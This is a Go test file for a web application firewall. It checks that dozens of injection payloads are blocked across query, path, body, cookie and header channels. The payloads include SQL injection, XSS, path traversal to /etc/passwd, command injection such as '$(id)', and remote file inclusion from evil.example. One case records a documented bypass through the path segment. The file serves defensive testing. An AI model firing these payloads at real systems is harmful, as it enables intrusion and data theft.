package bypass

import (
	"fmt"
	"net/url"
	"strings"
	"testing"
)

// TestWAFEvasions sends the same injection payloads through every
// channel and disguise an attacker uses; each must be refused with 403
// before the backend.
func TestWAFEvasions(t *testing.T) {
	h := start(t, "127.0.0.0/8")
	sqli := "' OR '1'='1"
	xss := "<script>alert(1)</script>"
	trav := "../../../../etc/passwd"
	cmd := ";cat /etc/passwd"
	q := url.QueryEscape
	cases := []struct {
		name string
		mk   func(ip string) (int, string)
		// accepted marks a gap the product documents rather than closes
		// (docs/SECURITY.md, "Known limits"); the harness asserts the
		// documented behaviour so a change is noticed either way.
		accepted bool
	}{
		{"sqli in query", func(ip string) (int, string) { return h.do(h.req("GET", "/search?q="+q(sqli), ip, "")) }, false},
		// The Core Rule Set inspects arguments, cookies and selected
		// headers for SQL injection at paranoia level 1, not the path
		// itself; a positive route policy or paranoia level 2 covers it.
		{"sqli in path segment (accepted at paranoia level 1)", func(ip string) (int, string) { return h.do(h.req("GET", "/search/"+q(sqli), ip, "")) }, true},
		{"sqli in form body", func(ip string) (int, string) {
			return h.do(h.req("POST", "/search", ip, "q="+q(sqli), "Content-Type", "application/x-www-form-urlencoded"))
		}, false},
		{"sqli in json body", func(ip string) (int, string) {
			return h.do(h.req("POST", "/search", ip, fmt.Sprintf(`{"q":%q}`, sqli), "Content-Type", "application/json"))
		}, false},
		{"sqli in multipart body", func(ip string) (int, string) {
			body, ct := multipart("q", "", "text/plain", []byte(sqli))
			body = strings.Replace(body, `; filename=""`, "", 1)
			return h.do(h.req("POST", "/search", ip, body, "Content-Type", ct))
		}, false},
		{"sqli in cookie", func(ip string) (int, string) { return h.do(h.req("GET", "/search", ip, "", "Cookie", "pref="+q(sqli))) }, false},
		{"sqli in user agent", func(ip string) (int, string) { return h.do(h.req("GET", "/search", ip, "", "User-Agent", sqli)) }, false},
		{"sqli in referer", func(ip string) (int, string) {
			return h.do(h.req("GET", "/search", ip, "", "Referer", "http://app.test/?x="+q(sqli)))
		}, false},
		{"sqli with inline comments", func(ip string) (int, string) { return h.do(h.req("GET", "/search?q="+q("1'/**/OR/**/'1'='1"), ip, "")) }, false},
		{"sqli mixed case union", func(ip string) (int, string) {
			return h.do(h.req("GET", "/search?q="+q("1 UnIoN sElEcT 1,2,3 -- "), ip, ""))
		}, false},
		{"sqli in second parameter", func(ip string) (int, string) {
			return h.do(h.req("GET", "/search?a=1&b=2&q="+q(sqli), ip, ""))
		}, false},
		{"sqli in chunked body", func(ip string) (int, string) {
			payload := "q=" + q(sqli)
			status := h.raw(fmt.Sprintf("POST /search HTTP/1.1\r\nHost: app.test\r\nX-Forwarded-For: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n%x\r\n%s\r\n0\r\n\r\n", ip, len(payload), payload))
			return status, ""
		}, false},
		{"xss in query", func(ip string) (int, string) { return h.do(h.req("GET", "/search?q="+q(xss), ip, "")) }, false},
		{"xss html entity encoded", func(ip string) (int, string) {
			return h.do(h.req("GET", "/search?q="+q("<scr&#x69;pt>alert(1)</script>"), ip, ""))
		}, false},
		{"xss event handler", func(ip string) (int, string) {
			return h.do(h.req("GET", "/search?q="+q(`<img src=x onerror=alert(1)>`), ip, ""))
		}, false},
		{"xss in json body", func(ip string) (int, string) {
			return h.do(h.req("POST", "/search", ip, fmt.Sprintf(`{"c":%q}`, xss), "Content-Type", "application/json"))
		}, false},
		{"traversal in query", func(ip string) (int, string) { return h.do(h.req("GET", "/file?name="+q(trav), ip, "")) }, false},
		{"traversal url encoded twice", func(ip string) (int, string) {
			return h.do(h.req("GET", "/file?name="+q(q(trav)), ip, ""))
		}, false},
		{"traversal in path segments", func(ip string) (int, string) {
			return h.raw(fmt.Sprintf("GET /files/..%%2f..%%2fetc/passwd HTTP/1.1\r\nHost: app.test\r\nX-Forwarded-For: %s\r\n\r\n", ip)), ""
		}, false},
		{"traversal with backslashes", func(ip string) (int, string) {
			return h.raw(fmt.Sprintf("GET /files/..\\..\\windows\\win.ini HTTP/1.1\r\nHost: app.test\r\nX-Forwarded-For: %s\r\n\r\n", ip)), ""
		}, false},
		{"traversal overlong utf-8", func(ip string) (int, string) {
			return h.raw(fmt.Sprintf("GET /files/%%c0%%ae%%c0%%ae/etc/passwd HTTP/1.1\r\nHost: app.test\r\nX-Forwarded-For: %s\r\n\r\n", ip)), ""
		}, false},
		{"command injection", func(ip string) (int, string) { return h.do(h.req("GET", "/ping?host=127.0.0.1"+q(cmd), ip, "")) }, false},
		{"command substitution", func(ip string) (int, string) { return h.do(h.req("GET", "/ping?host="+q("$(id)"), ip, "")) }, false},
		{"php wrapper inclusion", func(ip string) (int, string) { return h.do(h.req("GET", "/page?tpl="+q("php://input"), ip, "")) }, false},
		{"remote file inclusion", func(ip string) (int, string) {
			return h.do(h.req("GET", "/page?tpl="+q("http://evil.example/shell.txt?"), ip, ""))
		}, false},
		{"null byte in parameter", func(ip string) (int, string) {
			return h.do(h.req("GET", "/file?name="+q("photo.jpg\x00.php"), ip, ""))
		}, false},
		{"null byte in path", func(ip string) (int, string) {
			return h.raw(fmt.Sprintf("GET /files/photo.jpg%%00.php HTTP/1.1\r\nHost: app.test\r\nX-Forwarded-For: %s\r\n\r\n", ip)), ""
		}, false},
		{"control characters in target", func(ip string) (int, string) {
			return h.raw(fmt.Sprintf("GET /files/a%%01b HTTP/1.1\r\nHost: app.test\r\nX-Forwarded-For: %s\r\n\r\n", ip)), ""
		}, false},
		{"fullwidth unicode disguise", func(ip string) (int, string) {
			// NFKC folds ＜ｓｃｒｉｐｔ＞ to <script>; the normalised path is
			// what the WAF and the router see.
			return h.do(h.req("GET", "/search/"+q("＜script＞alert(1)＜/script＞"), ip, ""))
		}, false},
		{"content type disguise for form sqli", func(ip string) (int, string) {
			// A form body declared as plain text is still inspected as a body.
			return h.do(h.req("POST", "/search", ip, "q="+q(sqli), "Content-Type", "text/plain"))
		}, false},
	}
	for i, c := range cases {
		ip := fmt.Sprintf("198.51.100.%d", i+1) // one address per case: no ban interference
		before := h.backend.hits.Load()
		status, _ := c.mk(ip)
		if c.accepted {
			if status != 200 {
				t.Errorf("%s: documented as reaching the backend, got %d; update docs/SECURITY.md", c.name, status)
			}
			continue
		}
		h.denied(c.name, before, status, 403, 400)
	}
	// Control: the same channels carry harmless input.
	before := h.backend.hits.Load()
	status, _ := h.do(h.req("POST", "/search", "198.51.100.200", `{"q":"blue shoes size 42"}`, "Content-Type", "application/json"))
	h.served("clean json", before, status)
}
